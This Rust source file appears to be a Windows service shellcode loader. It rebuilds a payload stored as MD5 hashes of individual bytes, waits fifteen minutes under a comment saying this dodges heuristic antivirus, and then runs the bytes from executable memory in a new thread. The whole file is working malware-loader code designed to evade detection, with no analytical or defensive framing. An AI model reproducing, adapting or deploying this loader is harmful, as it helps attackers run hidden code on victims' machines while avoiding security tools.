mod shellcode;

use libc::{c_void, memcpy};
use shellcode::get_shellcode;
use std::error::Error;
use std::ffi::OsString;
use std::thread::sleep;
use std::time::Duration;
use windows_service::{define_windows_service, service_dispatcher};
use windows_sys::Win32::{
	Foundation::CloseHandle,
	Security::SECURITY_ATTRIBUTES,
	System::{
		Memory::{VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
		Threading::{CreateThread, WaitForSingleObject, INFINITE},
	},
};

define_windows_service!(ffi_service_main, service_main);

fn main() -> Result<(), Box<dyn Error>>
{
	service_dispatcher::start("", ffi_service_main)?;
	Ok(())
}

fn service_main(_args: Vec<OsString>)
{
	match run_shellcode()
	{
		Ok(_) => (),
		Err(_) => (),
	};
}

fn run_shellcode() -> Result<(), Box<dyn Error>>
{
	let hashes = get_shellcode();
	let mut bytes: Vec<u8> = Vec::new();

	for hash in hashes
	{
		for i in 0..=255
		{
			let test_hash = format!("{:x}", md5::compute([i]));
			if hash == test_hash
			{
				bytes.push(i);
			}
		}
	}

	// Dodge heuristic AV
	sleep(Duration::from_secs(15 * 60));

	unsafe {
		let buffer = VirtualAlloc(std::ptr::null(), bytes.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		memcpy(buffer, bytes.as_ptr() as *const c_void, bytes.len());

		let thread = CreateThread(
		                          std::ptr::null::<SECURITY_ATTRIBUTES>(),
		                          0,
		                          std::mem::transmute(buffer),
		                          std::ptr::null(),
		                          0,
		                          std::ptr::null_mut(),
		);

		WaitForSingleObject(thread, INFINITE);
		CloseHandle(thread);
		VirtualFree(buffer, 0, MEM_RELEASE);
	}

	Ok(())
}
